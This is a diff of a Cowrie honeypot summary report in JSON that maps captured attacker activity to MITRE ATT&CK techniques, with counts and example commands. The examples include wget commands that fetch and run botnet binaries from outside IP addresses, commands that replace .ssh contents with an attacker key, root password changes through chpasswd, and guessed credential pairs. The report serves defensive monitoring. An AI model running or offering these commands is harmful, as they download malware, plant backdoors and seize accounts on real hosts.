@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-23 01:02:38",
+  "generated": "2026-09-23 02:01:42",
   "totals": {
-    "commands": 511,
-    "login_failed": 268,
-    "login_success": 135,
-    "sessions": 300
+    "commands": 589,
+    "login_failed": 302,
+    "login_success": 145,
+    "sessions": 356
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 268,
+      "count": 302,
       "examples": [
         "pp / pp2025",
         "master / 123",
@@ -21,14 +21,14 @@
         "admin / P@$$w0rd"
       ],
       "first": "2026-09-23T00:00:18.585359Z",
-      "last": "2026-09-23T01:01:32.178262Z",
-      "unique_ips": 15
+      "last": "2026-09-23T01:58:24.964648Z",
+      "unique_ips": 18
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 135,
+      "count": 145,
       "examples": [
         "oliver / oliveroliver",
         "enable\\x00 / linuxshell\\x00",
@@ -37,43 +37,29 @@
         "rk / rk@123"
       ],
       "first": "2026-09-23T00:01:27.467287Z",
-      "last": "2026-09-23T00:59:56.105761Z",
-      "unique_ips": 12
+      "last": "2026-09-23T01:58:26.162659Z",
+      "unique_ips": 15
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 120,
+      "count": 126,
       "examples": [
         "ls -lh $(which ls)",
-        "ls /home; /bin/busybox BOTNET"
+        "ls /home; /bin/busybox BOTNET",
+        "ls -l /tmp/.testfile 2>&1",
+        "ls -l /var/tmp/.testfile 2>&1"
       ],
       "first": "2026-09-23T00:09:28.586484Z",
-      "last": "2026-09-23T00:14:27.672626Z",
-      "unique_ips": 5
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 71,
-      "examples": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64"
-      ],
-      "first": "2026-09-23T00:09:11.761925Z",
-      "last": "2026-09-23T00:25:16.964555Z",
-      "unique_ips": 8
+      "last": "2026-09-23T01:27:00.292234Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 65,
+      "count": 122,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -82,14 +68,30 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-09-23T00:09:15.535070Z",
-      "last": "2026-09-23T00:25:16.964555Z",
-      "unique_ips": 5
+      "last": "2026-09-23T01:59:22.192208Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 90,
+      "examples": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64"
+      ],
+      "first": "2026-09-23T00:09:11.761925Z",
+      "last": "2026-09-23T01:59:22.192208Z",
+      "unique_ips": 10
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 40,
+      "count": 41,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -98,22 +100,23 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-23T00:09:22.924859Z",
-      "last": "2026-09-23T00:21:16.458525Z",
-      "unique_ips": 6
+      "last": "2026-09-23T01:56:58.193372Z",
+      "unique_ips": 7
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 11,
       "examples": [
         "w",
         "whoami",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-23T00:09:31.061445Z",
-      "last": "2026-09-23T00:21:16.458525Z",
-      "unique_ips": 6
+      "last": "2026-09-23T01:58:30.649392Z",
+      "unique_ips": 7
     },
     {
       "id": "T1057",
@@ -181,15 +184,23 @@
   "unmapped": [
     [
       "system",
-      121
+      126
     ],
     [
       "sh",
-      120
+      125
     ],
     [
       "shell",
-      5
+      10
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      8
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
     ],
     [
       "RPMA",
@@ -200,8 +211,32 @@
       5
     ],
     [
-      "/bin/busybox UNSTABLE",
+      "echo WRITABLE >/tmp/.testfile 2>&1",
       4
+    ],
+    [
+      "rm -f /tmp/.testfile",
+      2
+    ],
+    [
+      "cd /tmp",
+      2
+    ],
+    [
+      "echo WRITABLE >/var/tmp/.testfile 2>&1",
+      2
+    ],
+    [
+      "rm -f /var/tmp/.testfile",
+      2
+    ],
+    [
+      "cd /var/tmp",
+      2
+    ],
+    [
+      "echo INFECT_CHECK",
+      2
     ],
     [
       "echo \"root:MJKn5M9fJJl1\"|chpasswd|bash",
@@ -225,10 +260,6 @@
     ],
     [
       "echo -e \"pp2025\\nKBj5DHk2Dga7\\nKBj5DHk2Dga7\"|passwd|bash",
-      1
-    ],
-    [
-      "echo \"pp2025\\nKBj5DHk2Dga7\\nKBj5DHk2Dga7\\n\"|passwd",
       1
     ]
   ]
